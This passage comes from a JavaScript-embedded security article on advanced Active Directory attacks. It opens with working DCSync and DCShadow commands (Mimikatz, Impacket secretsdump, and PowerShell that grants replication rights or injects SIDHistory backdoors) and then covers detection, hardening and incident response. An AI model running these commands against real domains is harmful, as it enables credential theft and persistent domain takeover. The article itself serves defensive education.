mimikatz # lsadump::dcsync /domain:domain.com /all /csv

# DCSync with specific DC
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator /dc:DC01.domain.com

# DCSync and save to file
mimikatz # log dcsync_output.txt
mimikatz # lsadump::dcsync /domain:domain.com /all</code></pre>

        <p><strong>DCSync with Impacket:</strong></p>
        <pre><code># DCSync all users
python secretsdump.py domain.com/user:password@DC01.domain.com

# DCSync specific user
python secretsdump.py domain.com/user:password@DC01.domain.com -just-dc-user Administrator

# DCSync with NTLM hash
python secretsdump.py -hashes :NTLM_HASH domain.com/user@DC01.domain.com

# DCSync with Kerberos ticket
export KRB5CCNAME=ticket.ccache
python secretsdump.py -k -no-pass DC01.domain.com

# DCSync and output to file
python secretsdump.py domain.com/user:password@DC01.domain.com -outputfile dcsync_hashes

# DCSync only NTDS (no SAM, SECURITY, SYSTEM)
python secretsdump.py domain.com/user:password@DC01.domain.com -just-dc-ntlm</code></pre>

        <p><strong>DCSync Output Format:</strong></p>
        <pre><code># Typical DCSync output:
domain.com\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
domain.com\\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
domain.com\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a5b8b3e2d4c6e8f0a1b2c3d4e5f6a7b8:::

# Format: username:RID:LM_hash:NTLM_hash:::
# LM hash is usually empty (aad3b435b51404eeaad3b435b51404ee)
# NTLM hash is what you need for Pass-the-Hash</code></pre>

        <p><strong>Granting DCSync Rights (Post-Exploitation):</strong></p>
        <pre><code># Grant DCSync rights to a user (requires DA or equivalent)
# Using PowerView
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" 
    -PrincipalIdentity "attacker" 
    -Rights DCSync

# Using ActiveDirectory module
$User = Get-ADUser -Identity "attacker"
$RootDSE = Get-ADRootDSE
$DomainDN = $RootDSE.defaultNamingContext
$ACL = Get-Acl "AD:$DomainDN"

# Add DS-Replication-Get-Changes
$GUID1 = New-Object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ACE1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $User.SID, "ExtendedRight", "Allow", $GUID1
)
$ACL.AddAccessRule($ACE1)

# Add DS-Replication-Get-Changes-All
$GUID2 = New-Object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$ACE2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $User.SID, "ExtendedRight", "Allow", $GUID2
)
$ACL.AddAccessRule($ACE2)

# Apply ACL
Set-Acl -Path "AD:$DomainDN" -AclObject $ACL</code></pre>

        <h3>DCShadow Attack</h3>

        <p>DCShadow is an advanced attack that allows an attacker to register a rogue Domain Controller and use it to inject objects or modify existing objects in Active Directory. Unlike DCSync which reads data, DCShadow writes data.</p>

        <p><strong>DCShadow Capabilities:</strong></p>
        <ul>
            <li>Create new objects in AD</li>
            <li>Modify existing objects</li>
            <li>Inject backdoors (SIDHistory, AdminSDHolder, etc.)</li>
            <li>Bypass most security controls and logging</li>
            <li>Changes appear to come from legitimate replication</li>
        </ul>

        <p><strong>DCShadow Requirements:</strong></p>
        <ul>
            <li>Ability to create computer objects (or compromise existing computer)</li>
            <li>Ability to modify service objects in Configuration partition</li>
            <li>Typically requires Domain Admin or equivalent privileges</li>
            <li>Two machines: one to register as DC, one to push changes</li>
        </ul>

        <p><strong>DCShadow with Mimikatz:</strong></p>
        <pre><code># On first machine (registers as rogue DC)
# Run as SYSTEM or with appropriate privileges
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:target_user /attribute:primaryGroupID /value:512

# On second machine (pushes the changes)
mimikatz # lsadump::dcshadow /push

# Example: Add user to Domain Admins via SIDHistory
mimikatz # lsadump::dcshadow /object:attacker /attribute:SIDHistory /value:S-1-5-21-XXX-XXX-XXX-512
mimikatz # lsadump::dcshadow /push

# Example: Modify AdminCount
mimikatz # lsadump::dcshadow /object:attacker /attribute:adminCount /value:1
mimikatz # lsadump::dcshadow /push

# Example: Modify servicePrincipalName
mimikatz # lsadump::dcshadow /object:target_computer /attribute:servicePrincipalName /value:HTTP/malicious.domain.com
mimikatz # lsadump::dcshadow /push</code></pre>

        <p><strong>DCShadow Detection Challenges:</strong></p>
        <ul>
            <li>Changes appear as legitimate replication</li>
            <li>No Event ID 4662 (Directory Service Access) generated</li>
            <li>Minimal forensic artifacts</li>
            <li>Requires monitoring replication metadata</li>
        </ul>

        <h3>Replication Permission Auditing</h3>

        <p><strong>Audit Current Replication Permissions:</strong></p>
        <pre><code># List all accounts with replication rights
$RootDSE = Get-ADRootDSE
$DomainDN = $RootDSE.defaultNamingContext
$ACL = Get-Acl "AD:$DomainDN"

$ACL.Access | Where-Object { 
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or 
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" 
} | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType

# Find non-standard accounts with replication rights
$ACL.Access | Where-Object { 
    ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or 
     $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -and
    $_.IdentityReference -notlike "*Domain Controllers*" -and
    $_.IdentityReference -notlike "*Enterprise Admins*" -and
    $_.IdentityReference -notlike "*Domain Admins*"
}</code></pre>

        <p><strong>Remove Unauthorized Replication Rights:</strong></p>
        <pre><code># Remove DCSync rights from user
# Using PowerView
Remove-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" 
    -PrincipalIdentity "unauthorized_user" 
    -Rights DCSync

# Using ActiveDirectory module
$User = Get-ADUser -Identity "unauthorized_user"
$RootDSE = Get-ADRootDSE
$DomainDN = $RootDSE.defaultNamingContext
$ACL = Get-Acl "AD:$DomainDN"

# Remove DS-Replication-Get-Changes
$GUID1 = New-Object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ACE1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $User.SID, "ExtendedRight", "Allow", $GUID1
)
$ACL.RemoveAccessRule($ACE1)

# Remove DS-Replication-Get-Changes-All
$GUID2 = New-Object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$ACE2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $User.SID, "ExtendedRight", "Allow", $GUID2
)
$ACL.RemoveAccessRule($ACE2)

# Apply ACL
Set-Acl -Path "AD:$DomainDN" -AclObject $ACL</code></pre>

        <h3>DCSync and DCShadow Detection</h3>

        <p><strong>DCSync Detection:</strong></p>
        <pre><code># Monitor Event ID 4662 - Directory Service Access
# Look for:
# - Access Mask: 0x100 (Control Access)
# - Properties: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
# - Properties: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)

# PowerShell monitoring script
$Events = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4662
} | Where-Object { 
    $_.Message -like "*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*" -or
    $_.Message -like "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
}

# Alert on DCSync from non-DC computers
$Events | Where-Object { 
    $_.Properties[1].Value -notlike "*DC*" 
}

# Monitor for unusual replication requests
# Normal: DC-to-DC replication
# Suspicious: Workstation or server requesting replication</code></pre>

        <p><strong>DCShadow Detection:</strong></p>
        <pre><code># Monitor for rogue DC registration
# Event ID 4742 - Computer account changed
# Look for changes to:
# - servicePrincipalName (addition of E3514235-4B06-11D1-AB04-00C04FC2DCD2/{GUID}/{DOMAIN})
# - serverReferenceBL

# Monitor Configuration partition changes
# Event ID 5137 - Directory Service object created
# Event ID 5141 - Directory Service object deleted
# In CN=Sites,CN=Configuration,DC=domain,DC=com

# PowerShell monitoring
$ConfigDN = (Get-ADRootDSE).configurationNamingContext
Get-ADObject -SearchBase "CN=Sites,$ConfigDN" -Filter * -Properties whenCreated | 
    Where-Object { $_.whenCreated -gt (Get-Date).AddHours(-1) }

# Monitor for suspicious replication metadata
# Check originating DC for object changes
repadmin /showobjmeta "CN=target_user,CN=Users,DC=domain,DC=com"

# Look for:
# - Originating DC that doesn't exist or is suspicious
# - Recent changes to sensitive attributes
# - Unusual replication timestamps</code></pre>

        <p><strong>Defense Strategies:</strong></p>
        <ul>
            <li><strong>Restrict Replication Rights:</strong> Only DCs should have replication permissions</li>
            <li><strong>Monitor Replication Permissions:</strong> Alert on any changes to replication ACLs</li>
            <li><strong>Enable Advanced Auditing:</strong> Audit Directory Service Access</li>
            <li><strong>Use Microsoft Defender for Identity:</strong> Detects DCSync and DCShadow automatically</li>
            <li><strong>Monitor DC Registration:</strong> Alert on new DC registrations</li>
            <li><strong>Implement Privileged Access Workstations:</strong> Limit where DA credentials can be used</li>
            <li><strong>Regular Permission Audits:</strong> Review domain root ACLs regularly</li>
        </ul>

        <p><strong>Incident Response:</strong></p>
        <pre><code># If DCSync is detected:

# 1. Identify the source
# Check Event ID 4662 for source computer and user

# 2. Isolate the compromised account
Disable-ADAccount -Identity "compromised_user"

# 3. Reset passwords for all privileged accounts
# Especially if krbtgt was synced

# 4. Rotate krbtgt password (twice)
.\\New-KrbtgtKeys.ps1

# 5. Review and remove unauthorized replication rights
# Audit domain root ACLs

# 6. Investigate lateral movement
# Check for other compromised accounts

# 7. Review all recent AD changes
# Look for backdoors (SIDHistory, AdminSDHolder modifications, etc.)

# 8. Implement additional monitoring
# Deploy Microsoft Defender for Identity if not already present</code></pre>

        <h2>Comprehensive Defense and Detection</h2>

        <h3>Critical Event IDs for AD Security Monitoring</h3>

        <p>Effective AD security monitoring requires understanding which events indicate potential attacks. Here are the most critical Event IDs to monitor:</p>

        <p><strong>Authentication Events:</strong></p>
        <ul>
            <li><strong>4768:</strong> Kerberos TGT requested
                <ul>
                    <li>Monitor for: Unusual encryption types (RC4 when AES is standard), pre-authentication failures, requests for sensitive accounts</li>
                    <li>Detects: Golden Ticket (missing 4768 before 4769), AS-REP Roasting (pre-auth type 0)</li>
                </ul>
            </li>
            <li><strong>4769:</strong> Kerberos service ticket requested
                <ul>
                    <li>Monitor for: Multiple requests in short time, unusual SPNs, RC4 encryption, requests without corresponding 4768</li>
                    <li>Detects: Kerberoasting, Silver Ticket attacks</li>
                </ul>
            </li>
            <li><strong>4771:</strong> Kerberos pre-authentication failed
                <ul>
                    <li>Monitor for: Multiple failures, failures for sensitive accounts</li>
                    <li>Detects: Password spraying, brute force attempts</li>
                </ul>
            </li>
            <li><strong>4624:</strong> Successful logon
                <ul>
                    <li>Monitor for: Logon type 3 (network) from unusual sources, logon type 10 (RDP) to sensitive servers</li>
                    <li>Detects: Lateral movement, unauthorized access</li>
                </ul>
            </li>
            <li><strong>4648:</strong> Logon using explicit credentials
                <ul>
                    <li>Monitor for: Credential delegation, unusual account usage</li>
                    <li>Detects: Pass-the-Hash, lateral movement</li>
                </ul>
            </li>
        </ul>

        <p><strong>Privilege and Permission Events:</strong></p>
        <ul>
            <li><strong>4672:</strong> Special privileges assigned to new logon
                <ul>
                    <li>Monitor for: Sensitive privilege assignments (SeDebugPrivilege, SeImpersonatePrivilege)</li>
                    <li>Detects: Privilege escalation, token manipulation</li>
                </ul>
            </li>
            <li><strong>4673:</strong> Sensitive privilege use
                <ul>
                    <li>Monitor for: Use of SeDebugPrivilege, SeTakeOwnershipPrivilege</li>
                    <li>Detects: Credential dumping, privilege abuse</li>
                </ul>
            </li>
            <li><strong>4674:</strong> Operation attempted on privileged object
                <ul>
                    <li>Monitor for: Attempts to access sensitive objects</li>
                    <li>Detects: Unauthorized access attempts</li>
                </ul>
            </li>
        </ul>

        <p><strong>Directory Service Events:</strong></p>
        <ul>
            <li><strong>4662:</strong> Operation performed on an object
                <ul>
                    <li>Monitor for: Replication operations (DCSync), ACL modifications, sensitive attribute access</li>
                    <li>Detects: DCSync, permission changes, backdoor creation</li>
                </ul>
            </li>
            <li><strong>5136:</strong> Directory service object modified
                <ul>
                    <li>Monitor for: Changes to delegation attributes, GPO modifications, AdminSDHolder changes</li>
                    <li>Detects: RBCD attacks, GPO abuse, persistence mechanisms</li>
                </ul>
            </li>
            <li><strong>5137:</strong> Directory service object created
                <ul>
                    <li>Monitor for: Computer account creation, GPO creation, suspicious object creation</li>
                    <li>Detects: RBCD setup, rogue DC registration (DCShadow)</li>
                </ul>
            </li>
            <li><strong>5141:</strong> Directory service object deleted
                <ul>
                    <li>Monitor for: Deletion of security objects, GPO deletion</li>
                    <li>Detects: Evidence destruction, security control removal</li>
                </ul>
            </li>
        </ul>

        <p><strong>Account Management Events:</strong></p>
        <ul>
            <li><strong>4720:</strong> User account created
                <ul>
                    <li>Monitor for: Creation of privileged accounts, suspicious account names</li>
                    <li>Detects: Backdoor account creation</li>
                </ul>
            </li>
            <li><strong>4722:</strong> User account enabled
                <ul>
                    <li>Monitor for: Enabling of disabled accounts, especially privileged accounts</li>
                    <li>Detects: Account resurrection attacks</li>
                </ul>
            </li>
            <li><strong>4724:</strong> Password reset attempt
                <ul>
                    <li>Monitor for: Password resets for privileged accounts</li>
                    <li>Detects: Account takeover attempts</li>
                </ul>
            </li>
            <li><strong>4728:</strong> Member added to security-enabled global group
                <ul>
                    <li>Monitor for: Additions to Domain Admins, Enterprise Admins, other privileged groups</li>
                    <li>Detects: Privilege escalation</li>
                </ul>
            </li>
            <li><strong>4732:</strong> Member added to security-enabled local group
                <ul>
                    <li>Monitor for: Additions to local Administrators group</li>
                    <li>Detects: Local privilege escalation</li>
                </ul>
            </li>
            <li><strong>4742:</strong> Computer account changed
                <ul>
                    <li>Monitor for: Changes to delegation settings, SPN modifications</li>
                    <li>Detects: DCShadow, delegation abuse</li>
                </ul>
            </li>
        </ul>

        <h3>Hardening Strategies</h3>

        <p><strong>Authentication Hardening:</strong></p>
        <pre><code># Disable NTLM (where possible)
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
# Network security: Restrict NTLM: Incoming NTLM traffic: Deny all accounts
# Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers: Deny all

# Enable SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Enable LDAP Signing
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
# Domain controller: LDAP server signing requirements: Require signing

# Enable LDAP Channel Binding
reg add HKLM\\System\\CurrentControlSet\\Services\\NTDS\\Parameters 
    /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f

# Disable RC4 Encryption
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
# Network security: Configure encryption types allowed for Kerberos
# Uncheck: RC4_HMAC_MD5

# Enable AES Encryption
# Ensure AES128_HMAC_SHA1 and AES256_HMAC_SHA1 are checked</code></pre>

        <p><strong>Delegation Hardening:</strong></p>
        <pre><code># Eliminate Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | 
    Where-Object { $_.Name -notlike "*DC*" } | 
    Set-ADComputer -TrustedForDelegation $false

# Set ms-DS-MachineAccountQuota to 0
Set-ADDomain -Identity "domain.com" -Replace @{"ms-DS-MachineAccountQuota"="0"}

# Mark sensitive accounts as "Account is sensitive and cannot be delegated"
Set-ADUser -Identity "Administrator" -AccountNotDelegated $true
Set-ADUser -Identity "Domain Admin User" -AccountNotDelegated $true

# Add sensitive accounts to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator", "DA_User"</code></pre>

        <p><strong>Service Account Hardening:</strong></p>
        <pre><code># Implement Group Managed Service Accounts (gMSA)
# Create KDS Root Key (only once per forest)
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# Create gMSA
New-ADServiceAccount -Name "gMSA_SQL" -DNSHostName "sql.domain.com" 
    -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers"

# Install gMSA on server
Install-ADServiceAccount -Identity "gMSA_SQL"

# For accounts that can't use gMSA, enforce strong passwords
# Minimum 25 characters, complex, random
# Use password manager or script to generate

# Disable pre-authentication requirement only when absolutely necessary
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | 
    Set-ADUser -DoesNotRequirePreAuth $false</code></pre>

        <p><strong>GPO Hardening:</strong></p>
        <pre><code># Restrict GPO modification to Domain Admins only
# Review GPO permissions
Get-GPO -All | Get-GPPermission -All | 
    Where-Object { $_.Trustee.Name -notlike "*Domain Admins*" -and 
                   $_.Permission -eq "GpoEditDeleteModifySecurity" }

# Remove unauthorized GPO permissions
Remove-GPPermission -Name "GPO Name" -TargetName "Unauthorized User" -TargetType User

# Enable GPO change auditing
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration
# Audit Policy Change: Success and Failure

# Implement SYSVOL file integrity monitoring
# Use tools like OSSEC, Tripwire, or Windows File Auditing</code></pre>

        <p><strong>Replication Hardening:</strong></p>
        <pre><code># Audit replication permissions
$RootDSE = Get-ADRootDSE
$DomainDN = $RootDSE.defaultNamingContext
$ACL = Get-Acl "AD:$DomainDN"

# Remove unauthorized replication rights
$ACL.Access | Where-Object { 
    ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or 
     $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -and
    $_.IdentityReference -notlike "*Domain Controllers*" -and
    $_.IdentityReference -notlike "*Enterprise Admins*" -and
    $_.IdentityReference -notlike "*Domain Admins*"
} | ForEach-Object { $ACL.RemoveAccessRule($_) }

Set-Acl -Path "AD:$DomainDN" -AclObject $ACL

# Enable Directory Service Access auditing
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration
# DS Access → Audit Directory Service Access: Success and Failure
# DS Access → Audit Directory Service Changes: Success and Failure</code></pre>

        <h3>Detection Tools and Technologies</h3>

        <p><strong>Microsoft Defender for Identity (MDI):</strong></p>
        <ul>
            <li>Detects Golden/Silver Ticket attacks</li>
            <li>Identifies DCSync and DCShadow attempts</li>
            <li>Monitors for Kerberoasting and AS-REP Roasting</li>
            <li>Detects NTLM relay attacks</li>
            <li>Identifies suspicious delegation configurations</li>
            <li>Provides attack timeline and investigation tools</li>
        </ul>

        <p><strong>SIEM Integration (Splunk/ELK/Sentinel):</strong></p>
        <pre><code># Example Splunk queries for AD attacks

# Detect Kerberoasting
index=windows EventCode=4769 Ticket_Encryption_Type=0x17 
| stats count by Account_Name 
| where count > 10

# Detect DCSync
index=windows EventCode=4662 Properties="*1131f6ad*" OR Properties="*1131f6aa*"
| search NOT Computer_Name="DC*"

# Detect Golden Ticket
index=windows EventCode=4769 
| search NOT [search index=windows EventCode=4768 | fields Account_Name]

# Detect NTLM Relay
index=windows EventCode=4624 Logon_Type=3 Authentication_Package=NTLM 
| stats count by Source_Network_Address, Account_Name 
| where count > 50

# Detect suspicious computer account creation
index=windows EventCode=5137 Object_Class=computer 
| stats count by Subject_Account_Name 
| where count > 5</code></pre>

        <p><strong>BloodHound for Attack Path Analysis:</strong></p>
        <pre><code># Regular BloodHound collection and analysis
.\\SharpHound.exe -c All --zipfilename bloodhound_$(Get-Date -Format "yyyyMMdd").zip

# Key queries to run regularly:
# 1. Find shortest path to Domain Admins from owned users
# 2. Find computers with unconstrained delegation
# 3. Find users with DCSync rights
# 4. Find kerberoastable users
# 5. Find AS-REP roastable users
# 6. Find users with path to GPO modification

# Automate BloodHound analysis
# Use BloodHound API or custom scripts to identify high-risk paths</code></pre>

        <p><strong>PowerShell Monitoring Scripts:</strong></p>
        <pre><code># Daily AD security check script
# Save as AD-SecurityCheck.ps1

# Check for new privileged group members
$Yesterday = (Get-Date).AddDays(-1)
Get-ADGroup -Filter {Name -like "*admin*"} | ForEach-Object {
    Get-ADGroupMember -Identity $_ | Where-Object { 
        (Get-ADUser $_ -Properties whenCreated).whenCreated -gt $Yesterday 
    }
}

# Check for accounts with delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | 
    Where-Object { $_.Name -notlike "*DC*" }

# Check for new computer accounts
Get-ADComputer -Filter {Created -gt $Yesterday}

# Check for accounts without pre-authentication
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Check for service accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | 
    Where-Object { $_.PasswordLastSet -lt (Get-Date).AddYears(-1) }

# Check for unauthorized replication rights
$RootDSE = Get-ADRootDSE
$DomainDN = $RootDSE.defaultNamingContext
$ACL = Get-Acl "AD:$DomainDN"
$ACL.Access | Where-Object { 
    ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or 
     $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -and
    $_.IdentityReference -notlike "*Domain Controllers*" -and
    $_.IdentityReference -notlike "*Enterprise Admins*" -and
    $_.IdentityReference -notlike "*Domain Admins*"
}

# Schedule this script to run daily
# schtasks /create /tn "AD Security Check" /tr "powershell.exe -File C:\\Scripts\\AD-SecurityCheck.ps1" /sc daily /st 08:00</code></pre>

        <h3>Incident Response Procedures</h3>

        <p><strong>Suspected Golden Ticket:</strong></p>
        <ol>
            <li>Identify affected accounts from Event ID 4769 without corresponding 4768</li>
            <li>Reset passwords for all privileged accounts immediately</li>
            <li>Rotate krbtgt password twice (wait for replication between rotations)</li>
            <li>Review all recent privileged account activity</li>
            <li>Check for persistence mechanisms (scheduled tasks, services, registry keys)</li>
            <li>Investigate source of compromise</li>
        </ol>

        <p><strong>Suspected DCSync:</strong></p>
        <ol>
            <li>Identify source from Event ID 4662</li>
            <li>Isolate compromised account/computer</li>
            <li>Reset passwords for all accounts (assume all hashes compromised)</li>
            <li>Rotate krbtgt password twice</li>
            <li>Review and remove unauthorized replication rights</li>
            <li>Investigate how attacker gained replication rights</li>
            <li>Check for backdoors and persistence</li>
        </ol>

        <p><strong>Suspected NTLM Relay:</strong></p>
        <ol>
            <li>Enable SMB signing immediately on all systems</li>
            <li>Enable LDAP signing and channel binding</li>
            <li>Identify relayed accounts from Event ID 4624</li>
            <li>Reset passwords for affected accounts</li>
            <li>Review changes made during relay window</li>
            <li>Check for RBCD configurations added via relay</li>
            <li>Investigate source of authentication (phishing, poisoning, etc.)</li>
        </ol>

        <p><strong>General Incident Response Checklist:</strong></p>
        <ul>
            <li>Preserve evidence (event logs, memory dumps, disk images)</li>
            <li>Isolate affected systems (but don't power off DCs)</li>
            <li>Reset compromised account passwords</li>
            <li>Review all recent AD changes (Event ID 5136, 5137, 5141)</li>
            <li>Check for persistence mechanisms across all attack vectors</li>
            <li>Rotate krbtgt password if credential theft suspected</li>
            <li>Implement additional monitoring and hardening</li>
            <li>Conduct post-incident review and update defenses</li>
        </ul>

        <h2>Key Takeaways</h2>

        <ul>
            <li>GPOs are powerful administrative tools but also prime targets for attackers—restrict modification rights and monitor SYSVOL closely</li>
            <li>Kerberos delegation, especially unconstrained delegation, presents significant security risks—eliminate where possible and use RBCD with caution</li>
            <li>NTLM relay attacks remain highly effective—enable SMB signing, LDAP signing, and channel binding across your environment</li>
            <li>Golden Tickets provide persistent domain access—rotate krbtgt password twice after suspected compromise</li>
            <li>Silver Tickets are stealthier than Golden Tickets—implement gMSA for service accounts to mitigate this risk</li>
            <li>Kerberoasting and AS-REP Roasting exploit weak service account passwords—use gMSA and enforce strong password policies</li>
            <li>DCSync allows credential theft without touching the DC—restrict replication rights and monitor Event ID 4662</li>
            <li>DCShadow enables stealthy AD modifications—monitor for rogue DC registration and unusual replication metadata</li>
            <li>Defense in depth is essential—combine hardening, monitoring, and incident response capabilities</li>
            <li>Microsoft Defender for Identity provides comprehensive detection for most AD attacks—deploy it if possible</li>
            <li>Regular security audits and BloodHound analysis help identify attack paths before attackers do</li>
            <li>The Protected Users group provides strong protection for sensitive accounts—use it for privileged users</li>
        </ul>

        <div class="conclusion-quote">
            <blockquote>
                "In Active Directory, every object tells a story, and every relationship reveals a path."
                <footer>— Enterprise Security Architect</footer>
            </blockquote>
        </div>
`
};

if (typeof window !== 'undefined') {
    if (!window.comprehensiveArticles) window.comprehensiveArticles = {};
    window.comprehensiveArticles['ad-advanced'] = adAdvancedAttacksArticle;
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = adAdvancedAttacksArticle;
}
